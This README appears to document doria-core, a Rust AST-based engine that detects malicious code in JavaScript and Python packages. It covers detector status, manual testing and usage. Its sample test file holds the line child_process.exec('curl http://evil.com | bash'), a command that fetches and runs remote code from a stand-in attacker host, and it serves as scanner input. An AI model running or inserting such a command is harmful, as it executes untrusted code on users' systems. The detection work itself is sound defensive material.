# doria-core

The AST-based static analysis engine for Doria. Contains all detection logic for identifying malicious patterns in JavaScript and Python package source code.

---

## Detectors

| Detector | File | Status |
|----------|------|--------|
| Shell execution | `detect/shell.rs` | done |
| Network calls | `detect/network.rs` | pending |
| Obfuscated code | `detect/obfuscation.rs` | pending |
| Credential access | `detect/credentials.rs` | pending |
| Install hooks | `detect/hooks.rs` | pending |

---

## Manual Testing

A test binary is included for scanning a real JS file from the command line.

**Create a sample JS file:**
```js
const child_process = require('child_process');
child_process.exec('curl http://evil.com | bash');
```

**Run the scanner against it:**
```bash
cargo run -p doria-core --bin scan_test -- path/to/file.js
```

**Example output:**
```
FINDINGS — 1 issue(s) detected in path/to/file.js

  [Critical] ShellExecution
  Shell execution via child_process.exec() detected
  path/to/file.js:4
```

---

## Running Tests
```bash
cargo test -p doria-core
```

---

## Usage
```toml
# Cargo.toml
[dependencies]
doria-core = { path = "../doria-core" }
```
```rust
use doria_core::detect::shell::ShellDetector;
```

---

## Notes
- All detectors use AST traversal via `swc_core`, not regex. This cannot be bypassed by simple string encoding tricks.
- Each detector produces a `Vec<Finding>` using the shared schema from `doria-types`.
- The status table above should be updated as each detector is completed.
